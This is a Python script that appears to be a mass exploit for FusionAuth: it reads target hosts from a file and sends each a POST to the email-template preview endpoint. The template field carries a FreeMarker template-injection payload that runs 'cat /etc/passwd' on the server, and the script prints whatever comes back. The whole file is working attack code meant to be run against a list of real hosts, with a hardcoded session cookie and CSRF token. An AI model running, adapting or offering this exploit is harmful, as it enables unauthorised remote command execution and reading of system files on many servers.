import requests,time
from urllib import request

def readf():#读取文件url
    with open('text.txt','r',encoding='utf-8') as fread:
        ips=[]
        for line in fread:
            
            #print(type(ips))
            a=line.replace("\n","")
            ips.append(a)
    return ips
def post1(url):#定义post数据
    url1="/ajax/email/template/preview"
    url2="https://"+url+url1
    #print(url2)
    header={
        "Host":url,
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
        "Accept":"*/*",
        "Accept-Language":"it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding":"gzip, deflate",
        "Content-Type":"application/x-www-form-urlencoded",
        "Content-Length":"796",
        "DNT": "1",
        "Connection": "close",
        "Referer": "http://"+url+"/admin/email/template/edit/2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b",
        "Cookie": "JSESSIONID=FA9DB3CBABA6B37E5336AE4B96001807;",
        }
    #print(header)
    datas="primeCSRFToken=kRC228UjAA4ohN_E9PW9kz0HpTlxUDCB_HVrDhBUfWU&emailTemplateId=2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b&emailTemplate.name=COPPA%20Notice&emailTemplate.defaultSubject=Notice%20of%20your%20consent&emailTemplate.fromEmail=no-reply%40fusionauth.io&emailTemplate.defaultFromName=FusionAuth&emailTemplate.defaultTextTemplate=You%20recently%20granted%20your%20child%20consent%20in%20our%20system.%20This%20email%20is%20to%20notify%20you%20of%20this%20consent.%20If%20you%20did%20not%20grant%20this%20consent%20or%20wish%20to%20revoke%20this%20consent%2C%20click%20the%20link%20below%3A%0A%0Ahttp%3A%2F%2Fexample.com%2Fconsent%2Fmanage%0A%0A-%20FusionAuth%20Admin&emailTemplate.defaultHtmlTemplate=${\"freemarker.template.utility.Execute\"?new()(\"cat /etc/passwd\")}}"
    #response=requests.post(url=url2,headers=header,data=datas)
    try:
        response = requests.post(url=url2,headers=header,data=datas,timeout=5)
        if response.status_code == 200:
            print("url:"+url+" response:"+response.text)
    except Exception as e:
        print("connect error")

'''
NETWORK_STATUS = True # 判断状态变量
    #try:
    response = requests.post(url=url2,headers=header,data=datas,timeout=5)
    if response.status_code == 200:
        return response
        print("url:"+url+"response:"+str(r.status))
    #except requests.exceptions.Timeout:
        # 捕获除与程序退出sys.exit()相关之外的所有异常
        
        NETWORK_STATUS = False # 请求超时改变状态
'''
# 测试url是否有效

if __name__=='__main__':
    
    r=readf()#读取ip
    for url4 in r:
        #5test_url(url4)
        print(url4)
        posturl=post1(url4)
     

